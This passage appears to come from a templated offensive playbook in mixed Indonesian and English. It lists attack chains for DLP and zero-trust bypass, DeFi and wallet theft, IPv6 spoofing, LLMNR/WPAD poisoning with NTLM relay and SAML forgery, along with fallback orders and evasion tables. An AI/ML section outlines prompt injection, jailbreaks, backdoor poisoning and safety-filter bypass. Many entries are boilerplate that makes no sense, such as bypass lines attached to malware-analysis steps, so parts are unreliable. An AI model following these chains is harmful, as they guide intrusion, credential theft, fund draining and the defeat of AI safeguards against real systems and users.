   └── Access elevated resource
   DETECTION: Access escalation detection
   BYPASS: Use alternate method

DATA (4):

1. DLP_BYPASS
   WHAT: DLP bypass techniques
   HOW:
   ├── Identify DLP rules
   ├── Find bypass vector
   ├── Bypass DLP
   └── Exfiltrate data
   DETECTION: DLP bypass detection
   BYPASS: Use alternate method

2. EXFIL_TUNNEL
   WHAT: Exfiltration tunnel
   HOW:
   ├── Create tunnel ke external
   ├── Exfiltrate data through tunnel
   ├── Bypass network monitoring
   └── Data exfiltration
   DETECTION: Exfiltration tunnel detection
   BYPASS: Use alternate method

3. ENCRYPTION_BYPASS
   WHAT: Encryption bypass
   HOW:
   ├── Identify encryption method
   ├── Find bypass vector
   ├── Bypass encryption
   └── Access plaintext data
   DETECTION: Encryption bypass detection
   BYPASS: Use alternate method

4. CLASSIFICATION_BYPASS
   WHAT: Data classification bypass
   HOW:
   ├── Identify classification labels
   ├── Find bypass vector
   ├── Bypass classification
   └── Access restricted data
   DETECTION: Classification bypass detection
   BYPASS: Use alternate method
```

**Fallback:**
MFA Bypass → SSO Abuse → Conditional Bypass → ZTNA Bypass →
Micro-seg Bypass → DLP Bypass → Tunnel Exfil → ALERT

---

### 29.13 Web3/DeFi

```
SMART_CONTRACT (8):

1. REENTRANCY
   WHAT: Reentrancy attack
   HOW:
   ├── Identify vulnerable contract
   ├── Create malicious contract
   ├── Call withdraw function
   ├── Callback ke malicious contract
   └── Drain funds before balance update
   DETECTION: Reentrancy monitoring
   BYPASS: Use alternate method

2. OVERFLOW
   WHAT: Integer overflow/underflow
   HOW:
   ├── Identify arithmetic operations
   ├── Craft overflow/underflow input
   ├── Bypass checks
   └── Manipulate balances
   DETECTION: Overflow monitoring
   BYPASS: Use alternate method

3. FRONT_RUN
   WHAT: Front-running (MEV)
   HOW:
   ├── Monitor mempool
   ├── Identify pending tx
   ├── Submit higher gas tx
   └── Execute before victim
   DETECTION: MEV monitoring
   BYPASS: Use alternate method

4. FLASH_LOAN
   WHAT: Flash loan attack
   HOW:
   ├── Borrow via flash loan
   ├── Manipulate price oracle
   ├── Exploit price difference
   └── Repay loan + profit
   DETECTION: Flash loan monitoring
   BYPASS: Use alternate method

5. ORACLE_MANIP
   WHAT: Oracle manipulation
   HOW:
   ├── Identify oracle source
   ├── Manipulate oracle data
   ├── Exploit price impact
   └── Profit from manipulation
   DETECTION: Oracle monitoring
   BYPASS: Use alternate method

6. ACCESS_CONTROL
   WHAT: Access control bypass
   HOW:
   ├── Identify access control flaws
   ├── Find unprotected function
   ├── Call privileged function
   └── Gain unauthorized access
   DETECTION: Access control monitoring
   BYPASS: Use alternate method

7. PROXY_UPGRADE
   WHAT: Proxy upgrade attack
   HOW:
   ├── Identify proxy pattern
   ├── Find upgrade vulnerability
   ├── Inject malicious implementation
   └── Gain control
   DETECTION: Proxy upgrade monitoring
   BYPASS: Use alternate method

8. SIGNATURE_ABUSE
   WHAT: Signature replay/abuse
   HOW:
   ├── Capture valid signature
   ├── Replay signature
   ├── Bypass nonce check
   └── Execute unauthorized tx
   DETECTION: Signature monitoring
   BYPASS: Use alternate method

DEFI_EXPLOIT (6):

1. LIQUIDITY_DRAIN
   WHAT: Liquidity pool drain
   HOW:
   ├── Identify liquidity pool
   ├── Find vulnerability
   ├── Exploit vulnerability
   └── Drain pool funds
   DETECTION: Liquidity monitoring
   BYPASS: Use alternate method

2. PRICE_MANIP
   WHAT: Price manipulation
   HOW:
   ├── Identify price mechanism
   ├── Manipulate price
   ├── Exploit price impact
   └── Profit from manipulation
   DETECTION: Price monitoring
   BYPASS: Use alternate method

3. YIELD_FARM
   WHAT: Yield farming exploit
   HOW:
   ├── Identify yield farm
   ├── Find vulnerability
   ├── Exploit vulnerability
   └── Drain rewards
   DETECTION: Yield monitoring
   BYPASS: Use alternate method

4. GOVERNANCE_ATTACK
   WHAT: Governance attack
   HOW:
   ├── Acquire governance tokens
   ├── Propose malicious proposal
   ├── Pass proposal
   └── Execute malicious action
   DETECTION: Governance monitoring
   BYPASS: Use alternate method

5. BRIDGE_EXPLOIT
   WHAT: Cross-chain bridge exploit
   HOW:
   ├── Identify bridge vulnerability
   ├── Craft malicious tx
   ├── Exploit bridge
   └── Drain bridge funds
   DETECTION: Bridge monitoring
   BYPASS: Use alternate method

6. LENDING_EXPLOIT
   WHAT: Lending protocol exploit
   HOW:
   ├── Identify lending vulnerability
   ├── Manipulate collateral
   ├── Exploit vulnerability
   └── Drain protocol
   DETECTION: Lending monitoring
   BYPASS: Use alternate method

WALLET_ATTACK (5):

1. SEED_PHRASE
   WHAT: Seed phrase theft
   HOW:
   ├── Create phishing site
   ├── Trick victim ke enter seed
   ├── Capture seed phrase
   └── Import ke attacker wallet
   DETECTION: Phishing detection
   BYPASS: Use alternate method

2. PRIVATE_KEY
   WHAT: Private key extraction
   HOW:
   ├── Access wallet file
   ├── Extract encrypted key
   ├── Brute force password
   └── Import ke attacker wallet
   DETECTION: Key extraction monitoring
   BYPASS: Use alternate method

3. APPROVAL_ABUSE
   WHAT: Token approval abuse
   HOW:
   ├── Trick victim ke approve
   ├── Use approval ke transfer
   └── Drain tokens
   DETECTION: Approval monitoring
   BYPASS: Use alternate method

4. PERMIT_SIGN
   WHAT: Permit signature abuse
   HOW:
   ├── Trick victim ke sign permit
   ├── Use permit ke transfer
   └── Drain tokens
   DETECTION: Permit monitoring
   BYPASS: Use alternate method

5. WALLET_CONNECT
   WHAT: WalletConnect hijack
   HOW:
   ├── Hijack WalletConnect session
   ├── Intercept connection
   ├── Drain funds
   └── Use session ke access wallet
   DETECTION: WalletConnect monitoring
   BYPASS: Use alternate method

NFT_EXPLOIT (3):

1. METADATA_MANIP
   WHAT: Metadata manipulation
   HOW:
   ├── Identify metadata storage
   ├── Modify metadata
   ├── Change NFT properties
   └── Profit from manipulation
   DETECTION: Metadata monitoring
   BYPASS: Use alternate method

2. RARITY_MANIP
   WHAT: Rarity manipulation
   HOW:
   ├── Identify rarity calculation
   ├── Manipulate traits
   ├── Change rarity score
   └── Profit from manipulation
   DETECTION: Rarity monitoring
   BYPASS: Use alternate method

3. ROYALTY_BYPASS
   WHAT: Royalty bypass
   HOW:
   ├── Identify royalty mechanism
   ├── Find bypass vector
   ├── Execute trade without royalty
   └── Bypass royalty payment
   DETECTION: Royalty monitoring
   BYPASS: Use alternate method

FALLBACK:
Reentrancy → Flash Loan → Oracle Manip → Front Run →
Access Control → Proxy Upgrade → Bridge Exploit → ALERT
```

---

### 29.14 Malware Analysis

```
STATIC_ANALYSIS (6):

1. PE_ANALYSIS
   WHAT: PE header analysis
   HOW:
   ├── Load PE file
   ├── Parse PE header
   ├── Extract sections, imports, exports
   └── Identify suspicious indicators
   DETECTION: PE analysis
   BYPASS: Use alternate method

2. ELF_ANALYSIS
   WHAT: ELF header analysis
   HOW:
   ├── Load ELF file
   ├── Parse ELF header
   ├── Extract sections, symbols
   └── Identify suspicious indicators
   DETECTION: ELF analysis
   BYPASS: Use alternate method

3. IMPORT_HASH
   WHAT: Import hash (imphash)
   HOW:
   ├── Extract import table
   ├── Calculate hash
   ├── Compare ke known hashes
   └── Identify malware family
   DETECTION: Import hash analysis
   BYPASS: Use alternate method

4. STRING_EXTRACT
   WHAT: String extraction
   HOW:
   ├── Extract printable strings
   ├── Analyze URLs, IPs, paths
   ├── Find C2 indicators
   └── Identify capabilities
   DETECTION: String analysis
   BYPASS: Use alternate method

5. PACKER_DETECT
   WHAT: Packer detection
   HOW:
   ├── Analyze PE structure
   ├── Identify packer signatures
   ├── Determine packer type
   └── Plan unpacking strategy
   DETECTION: Packer detection
   BYPASS: Use alternate method

6. YARA_SCAN
   WHAT: YARA rule scanning
   HOW:
   ├── Load YARA rules
   ├── Scan sample
   ├── Match rules
   └── Identify malware family
   DETECTION: YARA scanning
   BYPASS: Use alternate method

DYNAMIC_ANALYSIS (6):

1. SANDBOX_RUN
   WHAT: Sandbox execution
   HOW:
   ├── Submit ke sandbox
   ├── Execute sample
   ├── Monitor behavior
   └── Generate report
   DETECTION: Sandbox execution
   BYPASS: Use alternate method

2. API_MONITOR
   WHAT: API call monitoring
   HOW:
   ├── Hook API calls
   ├── Monitor function calls
   ├── Log parameters
   └── Analyze behavior
   DETECTION: API monitoring
   BYPASS: Use alternate method

3. NETWORK_CAPTURE
   WHAT: Network traffic capture
   HOW:
   ├── Capture network traffic
   ├── Analyze protocols
   ├── Extract C2 communication
   └── Identify infrastructure
   DETECTION: Network capture
   BYPASS: Use alternate method

4. REGISTRY_MONITOR
   WHAT: Registry change monitoring
   HOW:
   ├── Snapshot registry
   ├── Execute sample
   ├── Compare registry
   └── Identify changes
   DETECTION: Registry monitoring
   BYPASS: Use alternate method

5. FILE_MONITOR
   WHAT: File system change monitoring
   HOW:
   ├── Snapshot file system
   ├── Execute sample
   ├── Compare file system
   └── Identify changes
   DETECTION: File monitoring
   BYPASS: Use alternate method

6. MEMORY_FORENSIC
   WHAT: Memory forensics
   HOW:
   ├── Dump process memory
   ├── Analyze memory
   ├── Extract artifacts
   └── Identify malicious activity
   DETECTION: Memory forensics
   BYPASS: Use alternate method

UNPACKING (5):

1. UPX_UNPACK
   WHAT: UPX unpacking
   HOW:
   ├── Detect UPX packer
   ├── Use UPX utility
   ├── Unpack binary
   └── Analyze unpacked
   DETECTION: UPX unpacking
   BYPASS: Use alternate method

2. CUSTOM_UNPACK
   WHAT: Custom packer unpacking
   HOW:
   ├── Analyze packer
   ├── Write unpacking script
   ├── Unpack binary
   └── Analyze unpacked
   DETECTION: Custom unpacking
   BYPASS: Use alternate method

3. DEBUG_UNPACK
   WHAT: Debug-based unpacking
   HOW:
   ├── Load ke debugger
   ├── Set breakpoint ke OEP
   ├── Run ke breakpoint
   └── Dump unpacked binary
   DETECTION: Debug-based unpacking
   BYPASS: Use alternate method

4. EMULATION_UNPACK
   WHAT: Emulation-based unpacking
   HOW:
   ├── Use emulator (e.g., Unicorn)
   ├── Emulate unpacking code
   ├── Extract unpacked binary
   └── Analyze
   DETECTION: Emulation-based unpacking
   BYPASS: Use alternate method

5. DYNAMIC_UNPACK
   WHAT: Runtime unpacking
   HOW:
   ├── Execute packed binary
   ├── Wait for unpacking
   ├── Dump from memory
   └── Analyze dumped binary
   DETECTION: Dynamic unpacking
   BYPASS: Use alternate method

EVASION_ANALYSIS (5):

1. ANTI_DEBUG_DETECT
   WHAT: Anti-debug technique detection
   HOW:
   ├── Identify debug checks
   ├── Bypass IsDebuggerPresent
   ├── Bypass NtQueryInformationProcess
   └── Continue analysis
   DETECTION: Anti-debug detection
   BYPASS: Use alternate method

2. ANTI_VM_DETECT
   WHAT: Anti-VM technique detection
   HOW:
   ├── Identify VM checks
   ├── Bypass registry checks
   ├── Bypass hardware checks
   └── Continue analysis
   DETECTION: Anti-VM detection
   BYPASS: Use alternate method

3. ANTI_SANDBOX_DETECT
   WHAT: Anti-sandbox detection
   HOW:
   ├── Identify sandbox checks
   ├── Bypass timing checks
   ├── Bypass artifact checks
   └── Continue analysis
   DETECTION: Anti-sandbox detection
   BYPASS: Use alternate method

4. TIMING_EVASION
   WHAT: Timing-based evasion
   HOW:
   ├── Identify timing checks
   ├── Patch timing calls
   ├── Bypass sleep checks
   └── Continue analysis
   DETECTION: Timing evasion detection
   BYPASS: Use alternate method

5. ENVIRONMENT_CHECK
   WHAT: Environment check analysis
   HOW:
   ├── Identify environment checks
   ├── Document checks
   ├── Plan bypass strategy
   └── Continue analysis
   DETECTION: Environment check detection
   BYPASS: Use alternate method
```

**Fallback:**
Static Analysis → YARA Scan → Dynamic Analysis → API Monitor →
Network Capture → Memory Forensic → Unpack → Report

---

### 29.15 AI/ML Attacks

```
MODEL_ATTACKS (6):

1. MODEL_STEAL
   WHAT: Model extraction (query-based)
   HOW:
   ├── Query model repeatedly
   ├── Collect input/output pairs
   ├── Train surrogate model
   └── Replicate functionality
   DETECTION: Query monitoring
   BYPASS: Use alternate method

2. MODEL_POISON
   WHAT: Training data poisoning
   HOW:
   ├── Inject malicious data ke training
   ├── Manipulate model behavior
   ├── Create backdoor
   └── Trigger malicious output
   DETECTION: Data validation
   BYPASS: Use alternate method

3. MODEL_EVASION
   WHAT: Adversarial examples
   HOW:
   ├── Craft adversarial input
   ├── Add perturbation
   ├── Bypass classification
   └── Cause misclassification
   DETECTION: Adversarial detection
   BYPASS: Use alternate method

4. MODEL_INVERSION
   WHAT: Model inversion (data recovery)
   HOW:
   ├── Query model
   ├── Reconstruct training data
   ├── Extract sensitive information
   └── Privacy violation
   DETECTION: Inversion detection
   BYPASS: Use alternate method

5. MEMBERSHIP_INFER
   WHAT: Membership inference
   HOW:
   ├── Query model
   ├── Analyze confidence scores
   ├── Determine if data was in training
   └── Privacy violation
   DETECTION: Membership inference detection
   BYPASS: Use alternate method

6. BACKDOOR_INSERT
   WHAT: Backdoor insertion
   HOW:
   ├── Inject trigger ke training data
   ├── Train model dengan backdoor
   ├── Activate trigger ke cause output
   └── Hidden functionality
   DETECTION: Backdoor detection
   BYPASS: Use alternate method

PROMPT_INJECTION (5):

1. DIRECT_INJECTION
   WHAT: Direct prompt injection
   HOW:
   ├── Craft malicious prompt
   ├── Override system instructions
   ├── Extract hidden information
   └── Manipulate output
   DETECTION: Prompt injection detection
   BYPASS: Use alternate method

2. INDIRECT_INJECTION
   WHAT: Indirect (via document/URL)
   HOW:
   ├── Inject malicious content ke document
   ├── LLM processes document
   ├── Malicious instruction executed
   └── Data exfiltration
   DETECTION: Indirect injection detection
   BYPASS: Use alternate method

3. JAILBREAK
   WHAT: LLM jailbreaking
   HOW:
   ├── Craft jailbreak prompt
   ├── Bypass safety guardrails
   ├── Generate restricted content
   └── Bypass content policy
   DETECTION: Jailbreak detection
   BYPASS: Use alternate method

4. DATA_EXFIL
   WHAT: Data exfiltration via LLM
   HOW:
   ├── Trick LLM ke leak training data
   ├── Extract sensitive information
   ├── Use LLM as exfil channel
   └── Data theft
   DETECTION: Data exfiltration detection
   BYPASS: Use alternate method

5. TOOL_ABUSE
   WHAT: LLM tool abuse
   HOW:
   ├── Trick LLM ke use tool maliciously
   ├── Execute unauthorized action
   ├── Access restricted resources
   └── Cause damage
   DETECTION: Tool abuse detection
   BYPASS: Use alternate method

AI_INFRASTRUCTURE (5):

1. API_ABUSE
   WHAT: AI API abuse
   HOW:
   ├── Identify AI API endpoints
   ├── Abuse API functionality
   ├── Extract data
   └── Cause damage
   DETECTION: API abuse detection
   BYPASS: Use alternate method

2. TRAINING_DATA
   WHAT: Training data poisoning
   HOW:
   ├── Inject malicious data
   ├── Manipulate training process
   ├── Create backdoor
   └── Compromise model
   DETECTION: Training data validation
   BYPASS: Use alternate method

3. MODEL_SERVICE
   WHAT: Model service exploitation
   HOW:
   ├── Identify model service
   ├── Find vulnerability
   ├── Exploit vulnerability
   └── Compromise service
   DETECTION: Model service monitoring
   BYPASS: Use alternate method

4. VECTOR_DB
   WHAT: Vector database attack
   HOW:
   ├── Identify vector database
   ├── Inject malicious embeddings
   ├── Manipulate search results
   └── Compromise RAG system
   DETECTION: Vector database monitoring
   BYPASS: Use alternate method

5. EMBEDDING_POISON
   WHAT: Embedding poisoning
   HOW:
   ├── Inject poisoned embeddings
   ├── Manipulate similarity search
   ├── Redirect retrieval
   └── Compromise system
   DETECTION: Embedding validation
   BYPASS: Use alternate method

AI_SAFETY_BYPASS (5):

1. CONTENT_FILTER
   WHAT: Content filter bypass
   HOW:
   ├── Identify content filter
   ├── Craft bypass input
   ├── Bypass filter
   └── Generate restricted content
   DETECTION: Content filter bypass detection
   BYPASS: Use alternate method

2. SAFETY_TRAINING
   WHAT: Safety training bypass
   HOW:
   ├── Identify safety measures
   ├── Find bypass vector
   ├── Bypass safety training
   └── Generate harmful output
   DETECTION: Safety bypass detection
   BYPASS: Use alternate method

3. ALIGNMENT_BREAK
   WHAT: Alignment break
   HOW:
   ├── Craft adversarial input
   ├── Break model alignment
   ├── Cause unintended behavior
   └── Bypass safety measures
   DETECTION: Alignment monitoring
   BYPASS: Use alternate method

4. HALLUCINATION_EXP
   WHAT: Hallucination exploitation
   HOW:
   ├── Trigger hallucination
   ├── Extract false information
   ├── Use for social engineering
   └── Cause confusion
   DETECTION: Hallucination detection
   BYPASS: Use alternate method

5. BIAS_EXPLOIT
   WHAT: Bias exploitation
   HOW:
   ├── Identify model bias
   ├── Exploit bias
   ├── Manipulate output
   └── Cause harm
   DETECTION: Bias monitoring
   BYPASS: Use alternate method

FALLBACK:
Model Steal → Adversarial Example → Prompt Injection →
Data Poison → Jailbreak → API Abuse → Safety Bypass → ALERT
```

---

---
## 30. MODUL TAMBAHAN v3 (LAYER 41–60)

### 30.1 IPv6 Attacks

```
NDP_ATTACKS (5):

1. ra_spoof
   WHAT: Router Advertisement spoofing to hijack IPv6 client routing
   HOW:
   ├── Identify IPv6 hosts via multicast ping or passive sniffing
   ├── Send crafted Router Advertisement dengan attacker sebagai default gateway
   ├── Set short Router Lifetime untuk memaksa adopsi segera
   ├── Redirect victim traffic melalui prefix/MTU flags
   └── Capture traffic atau lakukan man-in-the-middle
   DETECTION: RA FloodGuard, SEND (SEcure Neighbor Discovery)
   BYPASS: Use Router Advertisement with high precedence

2. ns_flood
   WHAT: Neighbor Solicitation flood untuk exhaust resource NDP cache router
   HOW:
   ├── Flood target dengan spoofed Neighbor Solicitation packets
   ├── Generate banyak unresolved IPv6 target addresses
   ├── Force NDP cache exhaustion dan CPU router
   └── Disrupt neighbor resolution untuk host legitimate
   DETECTION: NDP cache monitoring, rate limiting
   BYPASS: Use multicast-targeted NS flood

3. dad_attack
   WHAT: Duplicate Address Detection DoS terhadap alamat SLAAC korban
   HOW:
   ├── Monitor DAD Neighbor Solicitation untuk tentative address korban
   ├── Respond dengan Neighbor Advertisement yang mengklaim address in use
   ├── Victim abandon tentative address assignment
   └── Block korban mendapat alamat yang valid secara berulang
   DETECTION: DAD failure logs, ND monitoring
   BYPASS: Use optimistic DAD bypass

4. redirect_attack
   WHAT: ICMPv6 Redirect manipulation untuk mengarahkan traffic korban
   HOW:
   ├── Send ICMPv6 Redirect ke victim mengklaim better next-hop
   ├── Arahkan korban ke gateway yang dikuasai attacker
   ├── Reroute traffic menuju jaringan target
   └── Intercept atau deny traffic korban
   DETECTION: ICMP redirect filtering, SEND validation
   BYPASS: Use RPL-based route injection

5. smurf_ipv6
   WHAT: ICMPv6 Smurf amplification via multicast echo requests
   HOW:
   ├── Send ICMPv6 Echo Request ke ff02::1 dengan spoofed victim source
   ├── Semua host multicast group membalas ke victim
   ├── Amplify traffic menuju alamat korban
   └── Saturasi link bandwidth dan CPU korban
   DETECTION: ICMPv6 amplification monitoring
   BYPASS: Use MLD-targeted amplification

DNSV6 (4):

1. dnsv6_spoof
   WHAT: DNS64/NAT64 spoofing untuk membajak resolusi IPv6-ke-IPv4
   HOW:
   ├── Poison response AAAA melalui DNS64 resolver
   ├── Inject attacker IPv6 prefix ke synthesized AAAA answers
   ├── Victim terhubung ke endpoint NAT64 attacker
   └── Intercept traffic aplikasi korban
   DETECTION: AAAA response validation
   BYPASS: Use DHCPv6 option 108 hijack

2. dnsv6_poison
   WHAT: DNS cache poisoning via AAAA records IPv6
   HOW:
   ├── Craft spoofed DNS response dengan bogus AAAA record
   ├── Guess transaction ID dan source port resolver
   ├── Poison recursive resolver cache untuk domain target
   └── Victim resolve ke alamat IPv6 attacker
   DETECTION: DNS transaction ID randomization, DNSSEC
   BYPASS: Use IPv6 fragmentation-based poisoning

3. dnsv6_exfil
   WHAT: DNS exfiltration data melalui AAAA queries IPv6
   HOW:
   ├── Encode data curian ke subdomain labels
   ├── Kirim DNS queries ke authoritative server attacker
   ├── Attacker server decode dan reassemble data
   └── Exfiltrate lewat traffic DNS yang diizinkan
   DETECTION: Unusual DNS query volume/entropy monitoring
   BYPASS: Use EDNS0 padding or slow drip exfil

4. dnsv6_tunnel
   WHAT: IPv6-in-IPv4 DNS tunneling sebagai covert channel
   HOW:
   ├── Establish client dan server tunnel endpoints
   ├── Encode tunneled packets ke dalam DNS queries/responses
   ├── Bypass egress filter jaringan IPv4-only
   └── Carry arbitrary traffic melalui DNS
   DETECTION: DNS packet size/query rate anomaly detection
   BYPASS: Use TXT record tunneling variant

TRANSITION_ABUSE (4):

1. teredo_abuse
   WHAT: Teredo tunnel exploitation untuk bypass filter IPv4
   HOW:
   ├── Enable Teredo client pada host IPv4-only
   ├── Tunnel traffic IPv6 melalui UDP 3544
   ├── Bypass egress firewall filtering
   └── Jangkau target IPv6 yang dibatasi
   DETECTION: Teredo traffic detection, UDP 3544 monitoring
   BYPASS: Use 6to4 variant

2. isatap_abuse
   WHAT: ISATAP tunnel exploitation untuk akses internal IPv6
   HOW:
   ├── Map alamat IPv4 ke interface ID ISATAP
   ├── Gunakan link-local ISATAP untuk menjangkau router
   ├── Bypass ACL IPv4 via 6in4 encapsulation
   └── Pivot ke service internal IPv6-only
   DETECTION: ISATAP protocol 41 monitoring
   BYPASS: Use manual 6in4 tunnel

3. 6to4_abuse
   WHAT: 6to4 anycast relay exploitation
   HOW:
   ├── Gunakan 6to4 relay (192.88.99.1)
   ├── Encap IPv6 dalam IPv4 (protocol 41)
   ├── Bypass network ACLs dan access controls
   └── Route ke jaringan IPv6 dari host IPv4-only
   DETECTION: Protocol 41 filtering
   BYPASS: Use ISATAP variant

4. dual_stack
   WHAT: Dual-stack protocol confusion untuk bypass security controls
   HOW:
   ├── Identifikasi host dual-stack dengan konektivitas v4 dan v6
   ├── Asumsikan kontrol IPv6 lebih lemah dari egress filter IPv4
   ├── Exfiltrate atau pivot melalui jalur IPv6
   └── Bypass monitoring yang hanya mencakup IPv4
   DETECTION: IPv6 visibility gaps, dual-stack traffic logging
   BYPASS: Force v6-first stack preference

FALLBACK:
RA Spoof → NS Flood → DNSv6 Spoof → Tunnel Abuse →
Dual Stack → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
IPv6 disabled on target           │ 1. Fallback to IPv4 chain
                                  │ 2. Use NAT64 path only
                                  │ 3. Re-log and alert
ICMPv6 filtered (RFC4890)         │ 1. Switch to passive scan
                                  │ 2. Use DHCPv6/SLAAC capture
                                  │ 3. Continue recon
SEND or CGA deployed              │ 1. Withdraw from NDP spoofing
                                  │ 2. Pivot to DHCPv6 exhaustion
                                  │ 3. Alert operator
ULA scope across segments         │ 1. Segregate attack per scope
                                  │ 2. Refine targets
                                  │ 3. Recompute fallback
RA overridden by real router      │ 1. Increase prefix precedence
                                  │ 2. Rapid RA burst
                                  │ 3. Fall back to redirect
Routed v6, no link-local          │ 1. Use tunnel proxy path
                                  │ 2. Attack from connected segment
                                  │ 3. Alert operator
```

---

### 30.2 mDNS/LLMNR/NBT-NS Poisoning

```
MDNS (4):

1. mdns_spoof
   WHAT: mDNS response spoofing untuk memalsukan resolusi host/service lokal
   HOW:
   ├── Listen pada 224.0.0.251:5353 untuk mDNS queries
   ├── Kirim spoofed mDNS response lebih cepat dari host asli
   ├── Poison cache korban dengan IP attacker
   ├── Victim terhubung ke service attacker
   └── Capture credentials atau lakukan mitm
   DETECTION: mDNS response anomaly detection
   BYPASS: Use cache poisoning with TTL 0 responses

2. mdns_rebind
   WHAT: DNS rebinding via mDNS untuk mengakses service internal
   HOW:
   ├── Register malicious service dengan hostname public
   ├── Tunggu korban melakukan resolve via mDNS
   ├── Rebind hostname ke IP internal taget
   └── Abuse same-origin policy untuk mengakses internal service
   DETECTION: mDNS query/reply monitoring
   BYPASS: Use IPv6 mDNS rebinding variant

3. mdns_info_leak
   WHAT: Service information disclosure via passive mDNS sniffing
   HOW:
   ├── Sniff multicast mDNS announcements
   ├── Kumpulkan service type, instance, TXT records
   ├── Map hostname, OS, dan service pada jaringan
   └── Feed hasil recon ke attack chain
   DETECTION: Multicast traffic logging
   BYPASS: Use passive recon via LLMNR

4. mdns_hijack
   WHAT: Pembajakan resolusi mDNS melalui shared DNS-SD search domain
   HOW:
   ├── Announce attacker service di local DNS-SD domain
   ├── Respond terhadap .local dan _tcp queries
   ├── Redirect korban ke printer/AirPlay instance malicious
   └── Intercept traffic AirDrop/Print/Chromecast
   DETECTION: Service announcement monitoring (Bonjour guard)
   BYPASS: Use legacy DNS-SD spoofing

LLMNR (4):

1. llmnr_poison
   WHAT: LLMNR poisoning dengan Responder untuk menangkap NTLM hashes
   HOW:
   ├── Enable LLMNR listener (UDP 5355)
   ├── Respond ke name queries yang tak ter-resolve dengan IP attacker
   ├── Victim melakukan NTLMv2 authentication ke SMB attacker
   ├── Capture hash lalu crack (hashcat)
   └── Gunakan cleartext password untuk lateral movement
   DETECTION: Disable LLMNR, monitor multicast DNS logs
   BYPASS: Use NBT-NS poisoning fallback

2. llmnr_relay
   WHAT: LLMNR to SMB relay tanpa cracking
   HOW:
   ├── Poison LLMNR queries seperti llmnr_poison
   ├── Relay NTLM captured ke service SMB target
   ├── Authenticate ke target dengan SMB signing disabled
   └── Eksekusi command atau akses file target
   DETECTION: Enforce SMB signing pada semua endpoint
   BYPASS: Use HTTP relay variant

3. llmnr_capture
   WHAT: Hash capture via LLMNR authenticated protocols
   HOW:
   ├── Answer LLMNR queries dengan HTTP/SMB server attacker
   ├── Paksa korban authenticate ke attacker
   ├── Capture NTLMv2 hashes pada logs
   └── Feed hash ke offline crack atau relay
   DETECTION: LLMNR traffic monitoring
   BYPASS: Use WPAD probe capture

4. llmnr_spoof
   WHAT: LLMNR response spoofing untuk impersonasi service
   HOW:
   ├── Reply ke LLMNR queries dengan spoofed source
   ├── Impersonasi hostname file/server
   ├── Redirect korban ke share malicious
   └── Harvest credentials atau kirim payload
   DETECTION: LLMNR response validation
   BYPASS: Use multicast cache poisoning

NBTNS (4):

1. nbtns_poison
   WHAT: NetBIOS Name Service (NBT-NS) poisoning
   HOW:
   ├── Listen pada UDP 137 untuk NetBIOS name queries
   ├── Respond dengan IP attacker terhadap unresolved names
   ├── Victim mengirim NTLM auth ke attacker
   ├── Capture hashes
   └── Crack atau relay credentials yang tertangkap
   DETECTION: NetBIOS traffic monitoring
   BYPASS: Use LLMNR poisoning fallback

2. nbtns_relay
   WHAT: NBT-NS to SMB relay
   HOW:
   ├── Poison NetBIOS name resolution
   ├── Relay authentication ke target SMB
   ├── Bypass signing atau gunakan CIFS relay
   └── Eksekusi command pada target yang di-relay
   DETECTION: Enforce SMB signing
   BYPASS: Use MSSQL relay variant

3. nbtns_capture
   WHAT: Hash capture via NBT-NS broadcasts
   HOW:
   ├── Sniff NetBIOS broadcast name registrations
   ├── Respond ke name queries dengan IP attacker
   ├── Capture NTLMv2 hashes dari korban auth
   └── Gunakan hash untuk offline cracking
   DETECTION: Broadcast logging dan monitoring
   BYPASS: Use multicast mDNS capture

4. nbtns_spoof
   WHAT: NBT-NS response spoofing
   HOW:
   ├── Forge NetBIOS name resolution responses
   ├── Redirect resource queries ke attacker
   ├── Impersonasi file shares dan service
   └── Intercept akses resource korban
   DETECTION: NBT-NS response audit
   BYPASS: Use .local hostname spoofing

WPAD (3):

1. wpad_poison
   WHAT: WPAD.dat poisoning untuk hijack proxy auto-detection
   HOW:
   ├── Serve wpad.dat malicious via HTTP
   ├── Reply ke WPAD proxy autodiscovery queries
   ├── Victim fetch proxy config malicious
   ├── Route seluruh proxy traffic melalui attacker
   └── Capture credentials HTTP/HTTPS
   DETECTION: Block WPAD, audit WPAD service (3498)
   BYPASS: Use PAC file cache poisoning

2. wpad_mitm
   WHAT: WPAD man-in-the-middle proxy interception
   HOW:
   ├── Enforce proxy config pada korban
   ├── Intercept traffic web korban
   ├── Inject content atau capture credentials
   ├── Log sensitive sessions
   └── Modifikasi response secara silent
   DETECTION: Proxy config redundancy check
   BYPASS: Use environment proxy override

3. wpad_exploit
   WHAT: WPAD auto-proxy exploitation untuk traffic redirection
   HOW:
   ├── Plant malicious proxy script di autodiscovery domain
   ├── Paksa korban load attacker PAC
   ├── Redirect host tertentu ke attacker
   └── Bypass direct internet access control
   DETECTION: PAC integrity verification
   BYPASS: Use DHCP-based WPAD supply

FALLBACK:
mDNS Poison → LLMNR Poison → NBT-NS Poison →
WPAD Poison → NTLM Relay → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
LLMNR/NBT-NS disabled             │ 1. Rely on mDNS-only vector
                                  │ 2. Enable WPAD fallback
                                  │ 3. Alert operator
SMB signing enforced              │ 1. Switch to HTTP relay
                                  │ 2. Use LDAP/MSSQL relay
                                  │ 3. Log partial success
Multicast queries blocked         │ 1. Use broadcast NBT probes
                                  │ 2. Targeted hostname queries
                                  │ 3. Alert operator
Hash uncrackable                  │ 1. Relay directly
                                  │ 2. Use mitm proxy path
                                  │ 3. Log hash for later
Network-capture noise high        │ 1. Pre-seed cache with names
                                  │ 2. Filter on victim IP
                                  │ 3. Retry failed queries
```

---

### 30.3 SAML/OIDC Attacks

```
SAML (6):

1. saml_xml_inject
   WHAT: XML signature wrapping untuk memanipulasi SAML assertions
   HOW:
   ├── Intercept valid SAML response
   ├── Insert element malicious sambil menjaga signature asli
   ├── Reference signed element dari forged context
   └── Kirim modified assertion sebagai legitimate
   DETECTION: XML canonicalization validation
   BYPASS: Use enveloped signature stripping

2. saml_assertion_replay
   WHAT: SAML assertion replay attack
   HOW:
   ├── Capture valid SAML assertion
   ├── Replay assertion ke SP sebelum expire
   ├── Bypass session establishment atau autentikasi
   └── Dapatkan akses dengan reused identity
   DETECTION: One-time assertion validation, NotBefore/NotOnOrAfter
   BYPASS: Use assertion in different step combination

3. saml_xxe
   WHAT: XXE dalam SAML request parsing
   HOW:
   ├── Kirim SAML request dengan external entity reference
   ├── Resolve external DTD untuk membaca file
